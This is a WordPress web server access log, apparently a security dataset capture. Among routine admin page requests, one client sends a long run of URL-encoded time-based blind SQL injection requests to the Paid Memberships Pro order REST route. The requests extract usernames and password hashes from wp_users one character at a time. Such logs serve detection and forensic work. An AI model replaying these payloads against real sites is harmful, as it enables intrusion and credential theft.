240.136.42.209 - - [05/Sep/2023:02:53:19 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
171.33.4.50 - - [05/Sep/2023:02:53:19 +0000] "GET /wp-admin/profile.php HTTP/1.1" 200 11832 "http://www.sipress.com/wp-admin/edit-comments.php?p=1&comment_status=approved" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:53:19 +0000] "GET /wp-admin/load-scripts.php?c=0&load%5Bchunk_0%5D=jquery-core,jquery-migrate,utils,zxcvbn-async,jquery-ui-core,jquery-ui-mouse,jquery-ui-sortable&ver=6.1.1 HTTP/1.1" 200 48694 "http://www.sipress.com/wp-admin/profile.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
47.53.122.78 - - [05/Sep/2023:02:53:16 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C3%2C1%29%29%3E96%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:19 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C3%2C1%29%29%3E112%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
171.33.4.50 - - [05/Sep/2023:02:53:21 +0000] "GET /wp-admin/tools.php HTTP/1.1" 200 7581 "http://www.sipress.com/wp-admin/profile.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:53:22 +0000] "GET / HTTP/1.1" 200 10405 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
47.53.122.78 - - [05/Sep/2023:02:53:19 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C3%2C1%29%29%3E104%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
171.33.4.50 - - [05/Sep/2023:02:53:24 +0000] "GET /wp-admin/index.php HTTP/1.1" 200 15956 "http://www.sipress.com/wp-admin/tools.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:53:24 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 836 "http://www.sipress.com/wp-admin/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:53:24 +0000] "GET / HTTP/1.1" 200 10404 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:53:25 +0000] "GET /wp-admin/index.php HTTP/1.1" 200 15956 "http://www.sipress.com/wp-admin/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
47.53.122.78 - - [05/Sep/2023:02:53:22 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C3%2C1%29%29%3E108%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:26 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C3%2C1%29%29%3E110%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:26 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C3%2C1%29%29%3E109%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:26 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C3%2C1%29%29%21%3D109%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
171.33.4.50 - - [05/Sep/2023:02:53:26 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 836 "http://www.sipress.com/wp-admin/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:53:27 +0000] "GET / HTTP/1.1" 200 10404 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:53:28 +0000] "GET / HTTP/1.1" 200 10404 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
47.53.122.78 - - [05/Sep/2023:02:53:26 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C4%2C1%29%29%3E96%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:29 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C4%2C1%29%29%3E112%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:29 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C4%2C1%29%29%3E104%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:32 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C4%2C1%29%29%3E108%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:32 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C4%2C1%29%29%3E106%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:32 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C4%2C1%29%29%3E105%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:32 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C4%2C1%29%29%21%3D105%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
240.136.42.209 - - [05/Sep/2023:02:53:34 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:53:32 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C5%2C1%29%29%3E96%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:35 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C5%2C1%29%29%3E112%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
171.33.4.50 - - [05/Sep/2023:02:53:35 +0000] "POST /wp-admin/post.php HTTP/1.1" 200 1066 "http://www.sipress.com/wp-admin/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
47.53.122.78 - - [05/Sep/2023:02:53:35 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C5%2C1%29%29%3E104%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
172.20.129.51 - - [05/Sep/2023:02:53:41 +0000] "GET / HTTP/1.1" 200 11469 "http://www.sipress.com/wp-admin/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:53:38 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C5%2C1%29%29%3E108%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:41 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C5%2C1%29%29%3E110%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
172.20.129.51 - - [05/Sep/2023:02:53:42 +0000] "GET /wp-admin/about.php HTTP/1.1" 200 14092 "http://www.sipress.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:53:42 +0000] "GET /wp-admin/images/about-header-about.svg?ver=6.1 HTTP/1.1" 200 4334 "http://www.sipress.com/wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-pointer,widgets&load%5Bchunk_1%5D=,site-icon,l10n,buttons,wp-auth-check&ver=6.1.1" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:53:41 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C5%2C1%29%29%3E109%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:44 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C5%2C1%29%29%21%3D110%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:44 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C6%2C1%29%29%3E96%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:44 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C6%2C1%29%29%3E48%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:44 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203651%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C6%2C1%29%29%3E1%2C0%2C1%29%29%29%29%29TUkd%29%20AND%20%27WxrM%27%3D%27WxrM HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:44 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E64%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:44 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit-comments.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:53:44 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E32%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:47 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E48%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:47 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E40%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:53:47 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E36%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
240.136.42.209 - - [05/Sep/2023:02:53:49 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:53:49 +0000] "GET /wp-admin/credits.php HTTP/1.1" 200 6898 "http://www.sipress.com/wp-admin/about.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:53:49 +0000] "GET /wp-admin/images/about-header-credits.svg?ver=6.1 HTTP/1.1" 200 7656 "http://www.sipress.com/wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-pointer,widgets&load%5Bchunk_1%5D=,site-icon,l10n,buttons,wp-auth-check&ver=6.1.1" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:53:50 +0000] "GET /wp-admin/freedoms.php HTTP/1.1" 200 7479 "http://www.sipress.com/wp-admin/credits.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:53:47 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%205113%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%20FROM%20wordpress.wp_users%20ORDER%20BY%20user_pass%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E34%2C0%2C1%29%29%29%29%29hriP%29%20AND%20%27jtWW%27%3D%27jtWW HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
172.20.129.51 - - [05/Sep/2023:02:53:50 +0000] "GET /wp-admin/images/freedom-1.svg?ver=6.1 HTTP/1.1" 200 1736 "http://www.sipress.com/wp-admin/freedoms.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:53:50 +0000] "GET /wp-admin/images/freedom-2.svg?ver=6.1 HTTP/1.1" 200 8411 "http://www.sipress.com/wp-admin/freedoms.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:53:50 +0000] "GET /wp-admin/images/freedom-4.svg?ver=6.1 HTTP/1.1" 200 3511 "http://www.sipress.com/wp-admin/freedoms.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:53:50 +0000] "GET /wp-admin/images/freedom-3.svg?ver=6.1 HTTP/1.1" 200 2115 "http://www.sipress.com/wp-admin/freedoms.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
